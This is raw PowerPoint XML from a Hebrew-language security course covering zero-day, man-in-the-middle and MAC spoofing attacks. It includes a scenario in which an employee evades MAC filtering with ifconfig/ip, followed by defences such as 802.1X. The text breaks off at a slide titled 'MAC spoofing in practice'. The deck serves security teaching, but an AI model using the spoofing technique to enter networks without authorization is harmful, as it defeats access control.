          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>ניצול </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>פגיעויות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> חדשות: שימוש בבאגים חדשים לפני שהתפרסמו תיקונים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> :Zero-Day Attacks</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>התקפות שמבוצעות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>מייד</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> עם גילוי הפגיעות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="38233518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D39B43-ED3D-4920-B2EE-69EB1180EDBF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="298173" y="632656"/>
            <a:ext cx="11804375" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" sz="3500" dirty="0"/>
              <a:t>7. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3500" dirty="0"/>
              <a:t>) Man-in-the-Middle (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3500" dirty="0" err="1"/>
              <a:t>MitM</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3500" dirty="0"/>
              <a:t>) Attack </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" sz="3500" dirty="0"/>
              <a:t>התקפת אדם בתווך)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8D4227B4-CC33-4933-BEED-0E0BC4CEEE8B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>הסבר</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>MitM</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>מתרחש כאשר תוקף מצליח להתמקם בין שני צדדים מתקשרים וליירט או לשנות את התקשורת ביניהם מבלי שידעו.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>סיפור</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>נניח שאתה מתחבר לרשת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Wi-Fi</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>ציבורית בבית קפה. התוקף מתחבר לאותה רשת ומעמיד פני נתב אינטרנטי. כל התקשורת שלך עוברת דרך התוקף, והוא יכול לראות או לשנות את המידע שאתה שולח ומקבל.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>דוגמאות</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> :Fake Wi-Fi Access Points</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הצבת נקודות גישה מזויפות ליירוט תקשורת.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Packet Sniffing</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: שימוש בכלים ליירוט וקריאת תעבורת רשת.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3551710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C6A4158-C7A3-4255-8D29-9FC9418C5848}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3965712" y="642594"/>
            <a:ext cx="7159487" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שאלות – סוגי פרצות אבטחה </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{96D8BD64-072E-4959-87FE-7C1D515CFD55}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>3. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>4. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>5. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3008591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847A8F9C-F3C6-4C8C-96F0-DF84F0D869B2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="2331720"/>
            <a:ext cx="10058400" cy="3931920"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="he-IL" sz="6600" dirty="0"/>
              <a:t>זיוף כתובת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="6600" dirty="0"/>
              <a:t>MAC/IP</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" sz="6600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="31410609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0ABAD2E-66F2-4693-8771-0F8B731E098F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1679712" y="642594"/>
            <a:ext cx="9445487" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>זיוף כתובת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>MAC (MAC Spoofing)</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7C99D24B-BAD5-4127-B826-F2E1C4B579C6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="2103120"/>
            <a:ext cx="10058400" cy="1067463"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>כתובת ה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> MAC (Media Access Control) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>היא מזהה ייחודי שמוקצה לכל כרטיס רשת ברמת החומרה. זיוף כתובת</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> MAC </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הוא תהליך שבו תוקף משנה את כתובת ה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>MAC </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> של כרטיס הרשת שלו לכתובת</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>MAC </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>אחרת, כדי להטעות את מערכת הרשת.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="19316761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7452D2-420C-4CA8-A8ED-5D5FE7969826}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4462670" y="642594"/>
            <a:ext cx="6662530" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשך – זיוף כתובת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>MAC</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A45C69B9-50D8-4104-B831-2D575AED0675}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>יתרונות של זיוף כתובת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>:MAC</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>עקיפת בקרת גישה: אם הרשת משתמשת בסינון כתובות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>MAC </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> כדי לאפשר גישה למכשירים מסוימים בלבד, ניתן להשתמש בזיוף כתובת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> MAC</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>כדי להתחבר לרשת.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>התחזות למכשיר אחר: ניתן לזייף כתובת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>MAC</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> כדי להיראות כמו מכשיר לגיטימי, לדוגמה, כדי להתחבר לרשת מוגבלת.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>חסרונות של זיוף כתובת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>:MAC</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הגבלה ברמת התקשורת: זיוף כתובת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> MAC</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>עובד בעיקר ברשתות מקומיות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>LAN</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> ולא ברשתות רחבות יותר כמו האינטרנט.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>גילוי ותגובה: ישנם כלים וטכניקות שיכולים לזהות זיוף כתובת</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> MAC </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>כמו ניתוח תעבורה או ניטור של התנהגות חשודה ברשת.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="33305270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068F07-0659-4CE9-B431-5FBCBCFAE01D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4383156" y="642594"/>
            <a:ext cx="6742043" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשך – זיוף כתובת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>MAC</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B3088064-5A7C-4FCC-80AE-A1238082C409}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>מניעת זיוף כתובת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>:MAC</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>אבטחת רשת עם </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>X</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> 802.1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> פרוטוקול אבטחה שמבצע אימות של מכשירים המחוברים לרשת על פי פרטי המשתמש ולא רק כתובת ה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>MAC </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>סינון כתובת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> :MAC </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שמירה על רשימה של כתובת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> MAC</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>מותרות והגבלת גישה רק למכשירים ברשימה זו.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="9207889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4C293D-4D60-45B1-BDCB-4A921655BD7E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="487017" y="642594"/>
            <a:ext cx="11201400" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>זיוף כתובת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>MAC – </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> "התחזות למכונה המועדפת"</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0F176988-ABD3-4195-AE14-7BA52B80C367}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>רקע:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>חברת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>סטארטאפ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> טכנולוגית גדולה רכשה מערכת ניהול רשת מתקדמת עם מערכת אבטחה מתקדמת. אחת מהמדיניות שהוגדרה היא הגבלה של גישה לרשתות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Wi-Fi </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>באמצעות סינון כתובות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>MAC</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> כתובות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> MAC</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>של מכשירים מורשים בלבד יכולות להתחבר לרשת, מה שמונע גישה בלתי מורשית.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>התקפה:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>אחד מהעובדים, ברק, עמד בפני פרויקט חשוב שהצריך ממנו גישה למערכת פנימית אבל הרשת הפנימית הייתה נגישה רק למכונות המיועדות עם כתובת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>MAC</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> מסוימת. ברק גילה שהוא יכול לשנות את כתובת ה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>MAC</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> של כרטיס הרשת שלו לכתובת של מכונה אחרת על ידי פקודות "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>ifconfig</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>" או "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>ip</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>" במערכת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>הלינוקס</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> שהוא השתמש בה.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>תוצאה:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>התקפה זו חשפה את החולשה במערכת סינון כתובות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> MAC</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שגרמה לבעיות אבטחה ברשת. החברה למדה את הלקח ויישמה פתרונות אבטחה נוספים כמו </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>X</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> 802.1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>כדי לחזק את אבטחת הרשת.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="315670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46C94A4-6C18-44C6-8577-896268C50B62}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2971800" y="235090"/>
            <a:ext cx="8153400" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>זיוף כתובת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>MAC</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> הלכה למעשה</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{938F1FDC-A2EC-42D5-AF4A-31C559C8151B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="1262270"/>
            <a:ext cx="10058400" cy="4772770"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="92500" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שימוש ב </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Linux </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> עם </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>ifconfig</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> אן עם </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>ip</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
